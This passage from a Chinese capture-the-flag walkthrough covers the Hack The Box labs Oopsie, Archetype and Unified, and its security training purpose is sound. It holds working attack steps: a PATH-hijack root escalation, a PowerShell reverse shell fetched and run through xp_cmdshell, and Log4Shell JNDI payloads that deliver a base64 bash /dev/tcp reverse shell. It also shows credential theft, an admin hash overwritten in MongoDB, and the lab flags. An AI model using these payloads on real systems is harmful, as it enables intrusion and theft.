3. 系统查找 cat:/tmp/cat 找到了（因为 PATH 优先）
4. 执行 /tmp/cat，实际执行的是 /bin/sh
5. 因为 bugtracker 是 SUID root，/tmp/cat 继承 root 权限
6. robert 获得 root Shell

```
robert@oopsie:/$ cd /tmp/ //切换到/tmp目录下
robert@oopsie:/tmp$ echo '/bin/sh' > cat //在此构造恶意的cat命令
robert@oopsie:/tmp$ chmod +x cat //赋予执行权限
robert@oopsie:/tmp$ export PATH=/tmp:$PATH //将/tmp目录设置为环境变量

robert@oopsie:/tmp$ echo $PATH 
/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

```

成功提权到root，切换到root目录找到flag

```
robert@oopsie:/tmp$ bugtracker 

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------

# whoami
root
# cd /root
# ls
reports  root.txt
# more root.txt
af13b0bee69f8a877c3faf667f7beacf

// 最后突然发现还需要提交Robert主目录的flag
# more /home/robert/user.txt
f2c74ee8db7983851ab2a96a44eb7981

```

answer：cat

Robert answer：f2c74ee8db7983851ab2a96a44eb7981

Root answer：af13b0bee69f8a877c3faf667f7beacf

# 靶场：Archetype(Windows)

因为接触Windows靶场比较少，所以把这次相关接口的小知识列举一下

|    维度     |    445端口（SMB）     |     1433端口（MSSQL）      |
| :-------: | :---------------: | :--------------------: |
| **核心功能**  |     文件/打印机共享      |        数据库连接与查询        |
| **操作系统**  |    Windows原生协议    |  数据库服务（需安装SQL Server）  |
| **认证方式**  |   NTLM、Kerberos   |    SQL认证、Windows认证     |
| **攻击入口**  |  共享枚举、漏洞利用、中继攻击   |     弱口令、SQL注入、存储过程     |
| **攻击成功后** |    文件读写、远程命令执行    |      数据库控制、系统命令执行      |
| **典型漏洞**  |   永恒之蓝、SMBGhost   |   xp_cmdshell提权、空密码    |
| **防护措施**  | 禁用SMBv1、强制签名、限制IP | 强密码、禁用xp_cmdshell、限制IP |

## Task 1

Which TCP port is hosting a database server?

直接nmap开扫，端口1433托管着sql服务器

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.129.48.155
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-17 06:24 -0400
Nmap scan report for 10.129.48.155
Host is up (0.45s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM

```

answer：1433

## Task 2

What is the name of the non-Administrative share available over SMB?

需要使用到工具smbclient

Smbclient(samba client)是基于SMB协议的,用于存取共享目标的客户端程序。

**参数**：仅列举了常用参数

|                  参数                  |               作用                |
| :----------------------------------: | :-----------------------------: |
|                 `-L`                 |      列出目标主机的所有共享（最常用，第一步）       |
|                 `-N`                 |           空密码登录（免交互）            |
|                 `-U`                 | 指定用户名，格式：`-U 用户名` 或 `-U 用户名%密码` |
|                 `-W`                 |       指定工作组/域名，如 `-W HTB`       |
|                 `-P`                 |         指定端口（默认445，极少用）         |
|                 `-c`                 | 执行单条命令后退出，如 `-c 'get user.txt'` |
|                 `-I`                 |        指定目标IP（当解析有问题时用）         |
|                 `-O`                 |          指定NetBIOS名称选项          |
|                 `-m`                 |     指定SMB协议最大版本，如 `-m SMB2`     |
| `--option="client min protocol=NT1"` |       强制降级到SMB1协议（兼容老机器）        |
|                 `-d`                 |  调试模式，`-d 0`~`-d 10` 控制输出详细程度   |

首先尝试查看445的共享能不能进行连接

```
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient -L 10.129.48.155
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.48.155 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

$结尾需要管理员权限，所以只能查看backups

**解释**：

|      协议/类型      |          路径格式           |                   示例                    |                  适用场景                   |
| :-------------: | :---------------------: | :-------------------------------------: | :-------------------------------------: |
|  **SMB/CIFS**   |       `//服务器/共享名`       |        `//10.129.48.155/backups`        | Linux下访问Windows共享（smbclient、mount.cifs） |
| **Windows UNC** |       `\\服务器\共享名`       |        `\\10.129.48.155\backups`        |        Windows资源管理器、cmd命令行访问网络共享        |
|    **本地文件**     |        `/路径/文件`         |          `/home/kali/backups`           |             Linux本地文件系统绝对路径             |
| **HTTP/HTTPS**  |     `http://域名/路径`      |     `http://example.com/index.html`     |         Web浏览器、curl、wget访问网页资源          |
|     **FTP**     |     `ftp://服务器/路径`      |       `ftp://192.168.1.1/files/`        |              FTP客户端下载/上传文件              |
|  **SSH/SFTP**   |     `ssh://服务器/路径`      |    `ssh://user@10.0.0.1/home/user/`     |             SSH连接或SFTP文件传输              |
|    **MySQL**    | `mysql://用户@服务器:端口/数据库` |   `mysql://root@localhost:3306/mydb`    |                数据库连接字符串                 |
|    **MSSQL**    | `mssql://用户@服务器:端口/数据库` | `mssql://sa@10.129.48.155:1433/master`  |             SQL Server连接字符串             |
|    **LDAP**     |     `ldap://服务器/路径`     | `ldap://192.168.1.10/dc=example,dc=com` |                 目录服务查询                  |
|    **file**     |      `file:///路径`       |     `file:///home/kali/backup.sql`      |           本地文件URI格式（浏览器、某些程序）           |
|  **SMB URL格式**  |     `smb://服务器/共享名`     |      `smb://10.129.48.155/backups`      |      完整SMB URI标准格式（GNOME/KDE文件管理器）      |
| **Windows本地路径** |        `盘符:\路径`         |         `C:\Windows\System32\`          |              Windows本地文件系统              |

answer：backups

## Task 3

What is the password identified in the file on the SMB share?

```
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.129.48.155/backups
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2618157 blocks available

```

下载到本地进行查看内容

```
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)

┌──(kali㉿kali)-[~/Desktop]
└─$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>      

```

answer：M3g4c0rp123

## Task 4

What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

获取到`User ID=ARCHETYPE\sql_svc`以及`Password=M3g4c0rp123`，因为现在kali以及内置了impacket，所以直接使用，参数为**强制使用 Windows 认证**模式进行连接

```
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-mssqlclient sql_svc@10.129.48.155 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> 

```

answer：mssqlclient.py

## Task 5

What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

登录成功后，验证一下权限

```  
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1   
SQL (ARCHETYPE\sql_svc  dbo@master)> 

```

回显为1，说明是sysadmin角色，拥有最高权限

现在需要开启xp_cmdshell，因为它本质是SQL Server 内置的一个**系统存储过程**，它的作用是调用 Windows 的 `cmd.exe` 命令解释器，一般默认是关闭的，这里进行尝试一下，结果为关闭的

**`xp_cmdshell` 就是 SQL Server 里的 "系统命令执行器"**，能让数据库像命令行一样执行 Windows 命令。

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master.dbo.xp_cmdshell 'whoami'
ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

```

开启`xp_cmdshell`

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options',1;                                    
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.                                                                                                    
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;

SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell',1;                                              
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.         SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;

```

接下来就可以正常使用执行系统命令了

```
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
output              
-----------------   
archetype\sql_svc              
NULL

```

answer：xp_cmdshell

## Task 6/7

Task 6 Q：What script can be used in order to search possible paths to escalate privileges on Windows hosts?

Task 7 Q：What file contains the administrator's password?

为了这个交互方式，获取一个完整的命令行窗口，准备使用Web下载+执行的方式，反弹一个shell给我的kali

对攻击机的操作：

在kali上生成一个反弹shell的脚本文件，之后启动HTTP服务

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo '$client = New-Object System.Net.Sockets.TCPClient("10.10.17.123",4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' > /tmp/winshell.ps1 

┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 
```

对目标机的操作：

在SQL会话中分步执行，先查看我们当前登录账号有权限读写的临时文件夹，然后进行下载

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master.dbo.xp_cmdshell 'echo %TEMP%';
output                                
-----------------------------------   
C:\Users\sql_svc\AppData\Local\Temp 
NULL


SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master.dbo.xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.17.123:8080/winshell.ps1 -OutFile C:\Users\sql_svc\AppData\Local\Temp\winshell.ps1"';
output   
------   
NULL

```

当目标机下载完成后，攻击机这时就可以对端口进行监听了，目标机此时执行脚本文件

对攻击机的操作：

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.10.17.123] from (UNKNOWN) [10.129.48.155] 49683

// 此时就已经获得win-shell的界面了
PS C:\Windows\system32> 

```

对目标机的操作：

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master.dbo.xp_cmdshell 'powershell -ExecutionPolicy Bypass -File "C:\Users\sql_svc\AppData\Local\Temp\winshell.ps1"';

```

之后就拿到了我们的第一个flag

```
PS C:\users\sql_svc> cd C:\users\sql_svc\desktop
PS C:\users\sql_svc\desktop> dir
    Directory: C:\users\sql_svc\desktop

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/25/2020   6:37 AM             32 user.txt                                                              

PS C:\users\sql_svc\desktop> type user.txt
3e7b102e78218e935bf3f4951fec21a3

```

但是现在的问题是，权限不够，那么接下来该登场的是**窗户上的豌豆**，本地先下载好win版本的开启服务，之后让目标机下载

对目标机的操作：

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC master.dbo.xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.17.123:8080/winPEAS.bat -OutFile C:\Users\sql_svc\Desktop\winPEAS.bat"';

```

对攻击机的操作：

```
// 因为我是直接从GitHub下载的，所以下载部分略过，直接启动HTTP服务
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 8080
10.129.48.155 - - [17/Jun/2026 08:57:23] "GET /winPEAS.bat HTTP/1.1" 200 -

```

完成之后，接下来就是使用该脚本

```
PS C:\users\sql_svc\desktop> .\winPEAS.bat

// 工具会帮我们列出可利用的信息，扫描完成后，其中会有一条信息说明PowerShell命令历史记录的保存点
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

// 打开该文件
PS C:\users\sql_svc\desktop> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!

```

Task 6 answer：winpeas
Task 7 answer：ConsoleHost_history.txt

查看文件发现一个管理员的账号密码，使用impacket进行登录

```
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-psexec administrator@10.129.48.155  

// 登录成功后
c:\Users> cd c:\users\Administrator\desktop
c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of c:\Users\Administrator\Desktop

07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,717,081,600 bytes free

c:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528

```

成功拿到flag

sql_svc answer：3e7b102e78218e935bf3f4951fec21a3
administrator answer：b91ccec3305e98240082d4474b848528

# 靶场：Unified(Linux)

## Task 1/2

Task 1 Q：Which are the first four open ports?

Task 2 Q：What is the title of the software that is running running on port 8443?

依旧先扫端口

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http            Apache Tomcat (language: en)
|_http-title: Did not follow redirect to https://10.129.49.244:8443/manage
|_http-open-proxy: Proxy might be redirecting requests
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Task 1 answer：22,6789,8080,8443

Task 2 answer：UniFi Network
## Task 3

What is the version of the software that is running?

进行访问8080端口时，它会自动跳转到8443端口的登录页：`https://10.129.49.244:8443/manage/account/login?redirect=%2Fmanage%2F`，界面中显示UniFi的版本为`6.4.54`

answer：6.4.54

## Task 4

What is the CVE for the identified vulnerability?

自行Google搜索，项目+版本号的相关CVE

搜到的结果是 Ubiquiti UniFi 网络 Log4Shell 直接检查 (CVE-2021-44228)

捆绑 Apache Log4j 日志记录库的 Ubiquiti UniFi Network 中存在一个远程代码执行漏洞。  
Apache Log4j 中存在漏洞，原因是处理用户控制的输入时对消息查找替换的保护不足。未经身份验证的远程攻击者可以利用此漏洞，通过 Web 请求以运行 Java 进程的权限级别执行任意代码。

**Java方面的一些知识**：

LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一个为查询、浏览和搜索而优化的数据库，具有树状结构，像文件目录一样，用于查询，具有优异的读性能。

JNDI(Java Naming and Directory Interface)：Java命名和目录接口(命名服务接口)

**命名服务**：用于根据名字找到位置、服务、信息、资源、对象等信息

**基本操作**：
1. 发布服务(名字和资源的映射)
2. 用名字查找资源

JDBC连接数据库需要提供驱动、数据库名、帐号、密码、ip、端口等信息，但JNDI连接数据库只需要提供名字，其他信息已经被封装在配置中，JNDI出现简化了访问资源

answer：CVE-2021-44228

## Task 5

进行抓包发现，数据包为`{"username":"admin","password":"111","remember":false,"strict":true}`

Log4j漏洞是在**日志记录阶段**触发的，而不是在业务逻辑处理阶段，尝试数据外带

```
{"username":"admin","password":"111","remember":"${jndi:ldap://88nb4b.dnslog.cn/exploit}","strict":true}

```

返回结果，`"api.err.InvalidPayload"`表示服务器成功解析了请求，但在**业务逻辑层**校验时发现了异常，如果没有Log4j就不会解析`${}`语法

|               返回信息               |                  解释                  |
| :------------------------------: | :----------------------------------: |
|          `"rc":"error"`          |             服务器明确返回了错误状态             |
| `"msg":"api.err.InvalidPayload"` | 请求体格式异常，而非认证失败（`InvalidCredentials`） |

```
{"meta":{"rc":"error","msg":"api.err.InvalidPayload"},"data":[]}

```

answer：LDAP

## Task 6/7

Task 6 Q：What tool do we use to intercept the traffic, indicating the attack was successful?

Task 7 Q：What port do we need to inspect intercepted traffic for?

**后续攻击流程**：
1. Linux中能够捕捉监听的工具：tcpdump
2. 通过rogue-jndi开启本地LDAP服务（依赖Java和maven环境）
3. 监听jndi注入的命令所使用的反弹shell端口
4. 实施jndi攻击

tcpdump工具介绍

用简单的话来定义tcpdump，就是：dump the traffic on a network，根据使用者的定义对网络上的数据包进行截获的包分析工具。

tcpdump可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。

tcpdump基于底层libpcap库开发，运行需要root权限。

**参数**：

|  参数  |                           含义                            |
| :--: | :-----------------------------------------------------: |
|  -a  |                     将网络地址和广播地址转变成名字                     |
|  -c  |                在收到指定的包的数目后，tcpdump就会停止；                 |
|  -d  |           将匹配信息包的代码以人们能够理解的汇编格式给出；以可阅读的格式输出。            |
| -dd  |                 将匹配信息包的代码以c语言程序段的格式给出；                  |
| -ddd |                   将匹配信息包的代码以十进制的形式给出；                   |
|  -e  |                   在输出行打印出数据链路层的头部信息；                    |
|  -f  |                将外部的Internet地址以数字的形式打印出来；                |
|  -l  |                      使标准输出变为缓冲行形式；                      |
|  -n  |                     直接显示IP地址，不显示名称；                     |
| -nn  |                   端口名称显示为数字形式，不显示名称；                    |
|  -t  |                     在输出的每一行不打印时间戳；                      |
|  -v  |           输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息；           |
| -vv  |                       输出详细的报文信息；                        |
|  -F  |                 从指定的文件中读取表达式,忽略其它的表达式；                  |
|  -i  |                       指定监听的网络接口；                        |
|  -r  |               从指定的文件中读取包(这些包一般通过-w选项产生)；                |
|  -w  |                  直接将包写入文件中，并不分析和打印出来；                   |
|  -T  | 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc （远程过程调用）和snmp（简单 网络管理协议；） |

因为Log4j漏洞的利用链，它的核心是JNDI注入，JNDI最常用的协议就是LDAP，**硬性要求**攻击者必须提供一个**LDAP服务**来接收查询。而**389端口是LDAP协议的默认端口**

Task 6 answer：tcpdump

Task 7 answer：389

## Task 9-13

Task 9 Q：What port is the MongoDB service running on?

Task 10 Q：What is the default database name for UniFi applications?

Task 11 Q：What is the function we use to enumerate users within the database in MongoDB?

Task 12 Q：What is the function we use to update users within the database in MongoDB?

Task 13 Q：What is the password for the root user?

再次抓包，这次将payload中的ip替换为攻击机，同时攻击机监听389端口

```
{"username":"admin","password":"111","remember":"${jndi:ldap://10.10.17.123/aaa}","strict":true}

┌──(kali㉿kali)-[~/Desktop]
└─$ sudo tcpdump -i tun0 port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes

```

攻击机的389端口收到了10.129.49.244从34170端口发出的数据，证明确实存在log4j漏洞

```
23:14:32.500814 IP 10.129.49.244.34170 > 10.10.17.123.ldap: Flags [S], seq 1440094507, win 64240, options [mss 1346,sackOK,TS val 2346656569 ecr 0,nop,wscale 7], length 0
23:14:32.500894 IP 10.10.17.123.ldap > 10.129.49.244.34170: Flags [R.], seq 0, ack 1440094508, win 0, length 0

```

因为kali自带了Java环境，所以现在安装maven环境，同时下载我们接下来所需要的rogue-jndi，用于 JNDI 注入攻击的恶意 LDAP 服务器 

`rogue-jndi`会像之前你手动监听389端口一样，收到这个请求。但它的厉害之处在于，它不仅会“听”，还会**根据你预先设定的命令，返回一个恶意的Java类，诱使靶场下载并执行，从而实现远程代码执行（RCE）**

**注意**：下载完之后，需要在目录下进行编译，编译完成后会在该目录下会生成target文件夹，target文件夹中存在RogueJndi-1.1.jar，拥有该jar包后可以构建payload

```
sudo apt install maven -y

git clone https://github.com/veracode-research/rogue-jndi

mvn package

```

接下来就是反向shell，且为了防止传输中的编码出现问题，先进行base64编码

```
┌──(kali㉿kali)-[~/Desktop/rogue-jndi/rogue-jndi/target]
└─$ echo bash -c 'bash -i >&/dev/tcp/10.10.17.123/4444 0>&1' | base64
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTcuMTIzLzQ0NDQgMD4mMQo=

```

之后可以构建命令，命令中`echo`之后的Base64编码字符串替换为自己生成的字符串。将主机名变量替换为攻击机ip

```
┌──(kali㉿kali)-[~/Desktop/rogue-jndi/rogue-jndi/target]
└─$ java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTcuMTIzLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.17.123"
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.17.123:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.10.17.123:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.10.17.123:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.17.123:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.17.123:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.17.123:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.10.17.123:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.17.123:1389/o=reference to artsploit.controllers.RemoteReference

```

复制payload，重新抓包，并且开始监听4444端口，拿到shell

```
{"username":"admin","password":"111","remember":"${jndi:ldap://10.10.17.123:1389/o=tomcat}","strict":true}

// 已经成功收到了靶机的LDAP请求，并且已经发送了恶意类的引用（ResourceRef）回去
Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload

┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.123] from (UNKNOWN) [10.129.49.244] 45412

```

需要了解unifi的数据库以及它的默认数据库名字是什么，于是直接Google搜索：unifi default database and whats the default database name，出现了UniFi's default database engine is `MongoDB`, and its default database name is `ace`

现在就需要查找数据库相关的信息，发现端口号是27117

```
ps aux | grep mongo
unifi         67  0.2  4.2 1100676 85672 ?       Sl   03:04   0:18 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi       3286  0.0  0.0  11468  1068 ?        S    05:01   0:00 grep mongo

```

通过mongo命令尝试提取管理员密码来与MongoDB服务进行交互，拿到关键信息

**解释**：
1. `db.admin.find()`：查询admin表下的所有数据，即查询所有用户
2. `forEach()`：遍历
3. `printjson`：json格式打印

```
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",

```

看到密码是`$6`开头的，于是搜索了一下是SHA512算法加密，如果是`$5`那就是SHA256加密，也可以通过hashid这个工具进行分辨

```
┌──(kali㉿kali)-[~]
└─$ hashid '$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.'
Analyzing '$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.'
[+] SHA-512 Crypt 

```

> 现在两种办法，第一个就是常规碰撞，但是要求你的字典够大够硬，时间还要足，还有运气。
> 
> 但是，这里的这里密码哈希位于 x_shadow 变量中，但在这种情况下，密码破解程序无法破解。
> 
> 所以我们只能采用第二种办法，我们创建的哈希更改 x_shadow 密码哈希，以替换管理员密码并通过管理面板进行身份验证。
> 
> 所以我们要先生成一个sha-512的hash,这里使用mkpasswd工具。

```
┌──(kali㉿kali)-[~]
└─$ mkpasswd -m sha-512 111111
$6$viyBO50Atvqpokkc$NyZlC1Uuqe5yp4HqsYSycrW5z2uQSL2MmJlwCkEBk1KKFxWWqhH7LSDfgMoyqmo6YUI5Pcdgz8C7lPfzfpXZn.

```

继续用mongo进行替换目标的管理员密码，发现匹配为1，修改为1

```
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$viyBO50Atvqpokkc$NyZlC1Uuqe5yp4HqsYSycrW5z2uQSL2MmJlwCkEBk1KKFxWWqhH7LSDfgMoyqmo6YUI5Pcdgz8C7lPfzfpXZn."}})'
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })

```

现在管理员的密码就是我们所更改的`111111`，去站点登录验证，成功后在设置中找到管理员账户的SSH凭证

```
root
NotACrackablePassword4U2022

```

接下来就是ssh一下

```
┌──(kali㉿kali)-[~]
└─$ ssh root@10.129.49.244

// 输入密码后
root@unified:~# ls
root.txt
root@unified:~# cat root.txt 
e50bc93c75b634e4b272d2f771c33681

// 后来发现还有个用户的flag
root@unified:~# cat /home/michael/user.txt 
6ced1a6a89e666c0620cdb10262ba127

```

Michiael answer：6ced1a6a89e666c0620cdb10262ba127

Task 9 answer：27117

Task 10 answer：ace

Task 11 answer：db.admin.find()

Task 12 answer：db.admin.update()

Task 13 answer：NotACrackablePassword4U2022

Root answer：e50bc93c75b634e4b272d2f771c33681